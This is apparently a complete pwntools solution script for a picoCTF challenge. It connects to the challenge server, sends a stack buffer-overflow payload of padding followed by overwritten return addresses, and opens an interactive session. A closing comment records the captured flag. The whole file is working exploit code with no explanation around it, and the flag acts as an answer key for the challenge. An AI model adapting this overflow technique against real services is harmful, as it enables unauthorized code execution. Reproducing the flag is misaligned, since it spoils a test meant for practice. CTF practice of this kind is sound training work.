from pwn import *
#r = process('/tmp/vuln')
r = remote('saturn.picoctf.net', 55023)
payload = b'a' * (0xa + 4) + p32(0x08049d90) + p32(0x08049e10)*8
r.sendline(payload)
r.interactive()
# reassemble flag from leaked contents
# flag: picoCTF{Cle4N_uP_M3m0rY_fb0696ee}

